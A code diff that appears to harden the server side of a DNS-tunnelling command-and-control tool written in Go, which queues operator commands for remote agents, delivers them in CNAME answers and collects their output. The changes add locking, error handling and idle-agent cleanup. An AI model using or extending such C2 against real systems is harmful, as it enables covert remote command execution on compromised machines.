@@ -9,6 +9,7 @@ import (
 	"io"
 	"math"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/miekg/dns"
@@ -27,6 +28,7 @@ type Server struct {
 	DNSSuffix                string
 	Mode                     string
 	connectedAgents          map[cryptography.PublicKeyStr]agentStatusForServer
+	agentsMutex              sync.RWMutex
 	io                       IO
 	// dedupPrevMsgHash is only for consecutive message duplicates
 	dedupPrevMsgHash uint64
@@ -67,16 +69,19 @@ type agentStatusForServer struct {
 }
 
 // New returns a new Server object
-func New() Server {
-	s := Server{}
+func New() *Server {
+	s := &Server{}
 	s.connectedAgents = make(map[cryptography.PublicKeyStr]agentStatusForServer)
 	return s
 }
 
 // ListAgents returns a list of agents connected to the server
-func (s Server) ListAgents() []string {
+func (s *Server) ListAgents() []string {
+	s.agentsMutex.RLock()
+	defer s.agentsMutex.RUnlock()
+	
 	// return a deduplicated list of agents
-	agents := make([]string, 0)
+	agents := make([]string, 0, len(s.connectedAgents))
 	for k := range s.connectedAgents {
 		agents = append(agents, string(k))
 	}
@@ -87,14 +92,17 @@ func (s Server) ListAgents() []string {
 // to the healthcheck will become different.
 func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
 	s.io.Logger(INFO, "Healthcheck, coming from %s", Packet.Signature.String())
+	
+	s.agentsMutex.Lock()
 	//register new agent in agent list
 	agent, ok := s.connectedAgents[Packet.Signature.String()]
 	if !ok {
 		s.io.Logger(INFO, "Registering new agent in our Connected Agent List, %d agent(s) are connected", len(s.connectedAgents)+1)
-		s.connectedAgents[Packet.Signature.String()] = agentStatusForServer{
+		agent = agentStatusForServer{
 			NextMessageType:                 c2.MessageHealthcheck,
-			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
+			HealthCheckIntervalMilliSeconds: 10000,
 			InBuffer:                        make(map[c2.PartID][]c2.MessagePacketWithSignature),
+			OutBuffer:                       make(map[c2.PartID][]string),
 		}
 	}
 	// agent already exists, only update the timestamps and prepare the next packet based on message type
@@ -104,16 +112,19 @@ func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature,
 	if agent.InBuffer == nil {
 		agent.InBuffer = make(map[c2.PartID][]c2.MessagePacketWithSignature)
 	}
+	if agent.OutBuffer == nil {
+		agent.OutBuffer = make(map[c2.PartID][]string)
+	}
 	s.connectedAgents[Packet.Signature.String()] = agent
+	s.agentsMutex.Unlock()
+	
 	switch agent.NextMessageType {
 	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
 		payload := []byte("Pong!")
 		if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
 			s.io.Logger(WARN, "Time difference between server and agent is more than 10 seconds. This is not acceptable. Agent: %s, Server: %s", time.Unix(int64(Packet.Msg.TimeStamp), 0).Format("2006-01-02T15:04:05-0700"), time.Now().Format("2006-01-02T15:04:05-0700"))
 		}
-		//todo: should we pass it on to MessageSyncTimeHandler function here?
 
-		// todo: check the actual next message time here and send a message appropriately
 		s.io.Logger(INFO, "preparing a response for a healthcheck message")
 		msg := c2.MessagePacket{
 			TimeStamp:   uint32(time.Now().Unix()),
@@ -126,7 +137,7 @@ func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature,
 		}
 
 		for _, A := range Answers {
-			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
+			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A))
 			if err != nil {
 				s.io.Logger(WARN, "%s", err)
 			}
@@ -135,15 +146,18 @@ func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature,
 		// this only happens when we're switching mode. after this one, the rest of the requests
 		// won't be coming in as healthcheck originally, so won't be hitting this function altogether
 	case c2.MessageExecuteCommand:
-		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
+		s.agentsMutex.RLock()
 		// first check to see if this is a residual packet from a previous multi-part convo
 		if len(agent.OutBuffer[agent.NextParentPartID]) == 0 {
+			s.agentsMutex.RUnlock()
 			return nil
 		}
 
 		// the last 0 in the index means that in response to any healthcheck, we will start with the first packet of the new conversation
 		// the rest should be handled by a response to this particular CNAME, hence not being part of a healtcheck response
 		cnameQ := fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][0])
+		s.agentsMutex.RUnlock()
+		
 		cname, err := dns.NewRR(cnameQ)
 		if err != nil {
 			s.io.Logger(WARN, "%s", err)
@@ -169,13 +183,18 @@ func (s *Server) displayCommandResult(fullPayload []byte, signature *cryptograph
 }
 
 func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
+	s.agentsMutex.Lock()
 	agent, ok := s.connectedAgents[Packet.Signature.String()]
 	if !ok {
+		s.agentsMutex.Unlock()
 		s.io.Logger(ERR, "agent not recognized")
+		return fmt.Errorf("agent not recognized: %s", Packet.Signature.String())
 	}
 	// handle multipart incoming
 	agent.InBuffer[Packet.Msg.ParentPartID] = append(agent.InBuffer[Packet.Msg.ParentPartID], Packet)
-	// if Packet.Msg.ParentPartID != 0 { // multi part
+	s.connectedAgents[Packet.Signature.String()] = agent
+	s.agentsMutex.Unlock()
+	
 	//fist and middle packets
 	msg := c2.MessagePacket{
 		TimeStamp:    uint32(time.Now().Unix()),
@@ -186,15 +205,19 @@ func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignatu
 	payload := []byte("Ack!")
 	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
 		msg.IsLastPart = true
+		s.agentsMutex.Lock()
 		agent.NextMessageType = c2.MessageHealthcheck
 		s.connectedAgents[Packet.Signature.String()] = agent
+		s.agentsMutex.Unlock()
 		payload = []byte("Ack! Last Part")
 	}
-	// Config.io.Logger(INFO,"sending plyload %#v\n", msg)
-	// time.Sleep(2 * time.Second)
-	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
+	
+	Answers, _, err := c2.PreparePartitionedPayload(msg, payload, s.DNSSuffix, s.privateKey, Packet.Signature)
+	if err != nil {
+		return fmt.Errorf("failed to prepare partitioned payload: %w", err)
+	}
 	for _, A := range Answers {
-		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
+		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A))
 		if err != nil {
 			s.io.Logger(WARN, "%s", err)
 		}
@@ -208,32 +231,45 @@ func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignatu
 		return nil
 	}
 
-	fullPayload := make([]byte, 0)
+	s.agentsMutex.RLock()
 	packets := c2.CheckMessageIntegrity(agent.InBuffer[Packet.Msg.ParentPartID])
+	s.agentsMutex.RUnlock()
+	
+	fullPayload := make([]byte, 0)
 	for _, packet := range packets {
 		packetPayload := packet.Msg.Payload[:]
 		fullPayload = append(fullPayload, packetPayload...)
 	}
-	// TODO: how do we acknowledge that we're done here and we both go back to healthcheck?
+	
 	// remove the buffer from memory
 	s.displayCommandResult(fullPayload, Packet.Signature)
 
 	s.io.Logger(DEBUG, "cleaning up buffer for %s", Packet.Signature.String())
-	// delete(agent.IncomingMessageBuffer, ParentPartID(Packet.Msg.ParentPartID))
+	s.agentsMutex.Lock()
+	delete(agent.InBuffer, Packet.Msg.ParentPartID)
 	delete(agent.OutBuffer, Packet.Msg.ParentPartID)
 	// sometimes the multipart messages also have a message with parent ID 0, which needs to be cleaned up
 	delete(agent.OutBuffer, c2.PartID(0))
+	s.connectedAgents[Packet.Signature.String()] = agent
+	s.agentsMutex.Unlock()
 
 	return nil
 }
 
 func (s *Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
 	// As part of the incoming packet, we'll get the partid as well as parentPartID so we know which part to send next. we just need to cache the whole partition up
-	Answers, parentPartID, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), s.DNSSuffix, s.privateKey, agentPublicKey)
-	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
-	//todo: what are we getting from the client? let's decrypt and log those
+	Answers, parentPartID, err := c2.PreparePartitionedPayload(msgPacket, []byte(msg), s.DNSSuffix, s.privateKey, agentPublicKey)
+	if err != nil {
+		return fmt.Errorf("failed to prepare partitioned payload: %w", err)
+	}
 
-	agent := s.connectedAgents[agentPublicKey.String()]
+	s.agentsMutex.Lock()
+	defer s.agentsMutex.Unlock()
+	
+	agent, ok := s.connectedAgents[agentPublicKey.String()]
+	if !ok {
+		return fmt.Errorf("agent not found: %s", agentPublicKey.String())
+	}
 
 	// check to see if the parent key exists first in case an agent disappears
 	if _, ok := agent.OutBuffer[parentPartID]; !ok {
@@ -246,7 +282,9 @@ func (s *Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptog
 
 		} else {
 			//initialize the map
-			agent.OutBuffer = make(map[c2.PartID][]string)
+			if agent.OutBuffer == nil {
+				agent.OutBuffer = make(map[c2.PartID][]string)
+			}
 			targetBuffer = append(targetBuffer, Answers...)
 			agent.OutBuffer[parentPartID] = targetBuffer
 		}
@@ -257,8 +295,6 @@ func (s *Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptog
 	agent.NextMessageType = msgPacket.MessageType
 	agent.NextParentPartID = parentPartID
 	s.connectedAgents[agentPublicKey.String()] = agent
-	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
-	// todo: set interval before returning the packet
 	return nil
 }
 
@@ -284,81 +320,105 @@ func (s *Server) sendMessageToAgent(agentPublicKey *cryptography.PublicKey, comm
 }
 
 func (s *Server) messageChatHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
-	agent := s.connectedAgents[Packet.Signature.String()]
+	s.agentsMutex.RLock()
+	agent, ok := s.connectedAgents[Packet.Signature.String()]
+	if !ok {
+		s.agentsMutex.RUnlock()
+		return fmt.Errorf("agent not found: %s", Packet.Signature.String())
+	}
+	
 	acknowledgedID := Packet.Msg.PartID
 	// handle last packet ID
-	// NOTE: this makes no sense?
 	if c2.PartID(uint16(len(agent.OutBuffer[agent.NextParentPartID]))) == acknowledgedID {
+		s.agentsMutex.RUnlock()
 		return nil
 	}
 	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
+		s.agentsMutex.RUnlock()
 		// reset the agent status to healthcheck and clean the buffer
+		s.agentsMutex.Lock()
 		agent.NextMessageType = c2.MessageHealthcheck
 		delete(agent.OutBuffer, agent.NextParentPartID)
+		s.connectedAgents[Packet.Signature.String()] = agent
+		s.agentsMutex.Unlock()
 		return nil
 	}
-	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1]))
+	
+	cnameStr := fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1])
+	s.agentsMutex.RUnlock()
+	
+	cname, err := dns.NewRR(cnameStr)
 	if err != nil {
 		s.io.Logger(WARN, "%s", err)
 	}
-	// todo: go back to the healthcheck handler and send the next packet
-	// todo: print output
 	q.Answer = append(q.Answer, cname)
-	// Config.io.Logger(INFO,"sending chat message '%s' to the client", command)
-	//msg := c2.MessagePacket{
-	//	TimeStamp:   uint32(time.Now().Unix()),
-	//	MessageType: c2.MessageChat,
-	//}
-	//return MustSendMsg(msg, agentPublicKey, c2.MessageChat, command)
 	return nil
 }
 
 func (s *Server) messageChatResResHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
 	// we only get this when the message's last part have been received and parsed.
 	// just need to switch back the agent to healthcheck mode
-	agent := s.connectedAgents[Packet.Signature.String()]
+	s.agentsMutex.Lock()
+	defer s.agentsMutex.Unlock()
+	
+	agent, ok := s.connectedAgents[Packet.Signature.String()]
+	if !ok {
+		return fmt.Errorf("agent not found: %s", Packet.Signature.String())
+	}
 	agent.NextMessageType = c2.MessageHealthcheck
 	s.connectedAgents[Packet.Signature.String()] = agent
 
 	return nil
-
 }
 
 // remove idle agents after 60 seconds
 func (s *Server) removeIdleAgents() {
 	s.io.Logger(INFO, "Removing idle agents")
+	s.agentsMutex.Lock()
+	defer s.agentsMutex.Unlock()
+	
 	for k, v := range s.connectedAgents {
 		idleTime := time.Now().Unix() - int64(v.LastAckFromAgentServerTime)
-		if idleTime > 60 {
+		if idleTime > int64(c2.AgentTimeoutDuration.Seconds()) {
 			s.io.Logger(INFO, "removing agent %s since it has been idle for %d seconds", k, idleTime)
 			delete(s.connectedAgents, k)
-			// for i := range UiAgentList.FindItems(k, "", false, true) {
-			// 	UiAgentList.RemoveItem(i)
-			// }
 		}
 	}
 }
 
 // handle incoming "ack" packets of multipart RunCommand packets from agents
 func (s *Server) handleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
-	agent := s.connectedAgents[Packet.Signature.String()]
+	s.agentsMutex.RLock()
+	agent, ok := s.connectedAgents[Packet.Signature.String()]
+	if !ok {
+		s.agentsMutex.RUnlock()
+		return fmt.Errorf("agent not found: %s", Packet.Signature.String())
+	}
+	
 	acknowledgedID := Packet.Msg.PartID
 	// handle last packet ID
 	if c2.PartID(uint16(len(agent.OutBuffer[agent.NextParentPartID]))) == acknowledgedID {
+		s.agentsMutex.RUnlock()
 		return nil
 	}
 	if Packet.Msg.IsLastPart {
+		s.agentsMutex.RUnlock()
 		// reset the agent status to healthcheck and clean the buffer
+		s.agentsMutex.Lock()
 		agent.NextMessageType = c2.MessageHealthcheck
 		delete(agent.OutBuffer, agent.NextParentPartID)
+		s.connectedAgents[Packet.Signature.String()] = agent
+		s.agentsMutex.Unlock()
 		return nil
 	}
-	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1]))
+	
+	cnameStr := fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1])
+	s.agentsMutex.RUnlock()
+	
+	cname, err := dns.NewRR(cnameStr)
 	if err != nil {
 		s.io.Logger(WARN, "%s", err)
 	}
-	// todo: go back to the healthcheck handler and send the next packet
-	// todo: print output
 	q.Answer = append(q.Answer, cname)
 	return nil
 }
@@ -470,8 +530,6 @@ func (s *Server) RunServer(serverIO IO) error {
 
 	s.io.Logger(INFO, "Use the following public key to connect agents: %s", s.privateKey.GetPublicKey().String())
 
-	// TODO: enable allowing only a set of public keys to connect
-
 	if !strings.HasSuffix(s.DNSSuffix, ".") {
 		s.DNSSuffix = s.DNSSuffix + "."
 	}
@@ -481,14 +539,27 @@ func (s *Server) RunServer(serverIO IO) error {
 
 	dnsErrChan := make(chan error)
 	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				s.io.Logger(ERR, "Panic recovered in DNS server: %v", r)
+			}
+		}()
 		dnsErrChan <- s.runDNS(s.io.GetContext())
 	}()
+
+	// Start periodic cleanup of idle agents
+	cleanupTicker := time.NewTicker(c2.AgentTimeoutDuration / 2)
+	defer cleanupTicker.Stop()
 
 	for {
 		select {
 		case text := <-s.io.GetInputFeed():
 			if len(text.Prompt) > 0 {
-				agent, _ := cryptography.PublicKeyFromString(cryptography.PublicKeyStr(text.Agent))
+				agent, err := cryptography.PublicKeyFromString(cryptography.PublicKeyStr(text.Agent))
+				if err != nil {
+					s.io.Logger(WARN, "invalid agent public key: %s", err)
+					continue
+				}
 				err = s.sendMessageToAgent(agent, text.Prompt)
 				if err != nil {
 					s.io.Logger(WARN, "%s", err)
@@ -496,6 +567,8 @@ func (s *Server) RunServer(serverIO IO) error {
 					s.io.Logger(DEBUG, "Sent message to %s", text.Agent)
 				}
 			}
+		case <-cleanupTicker.C:
+			s.removeIdleAgents()
 		case <-s.io.GetContext().Done():
 			s.io.Logger(INFO, "Context cancelled, shutting down")
 			return nil
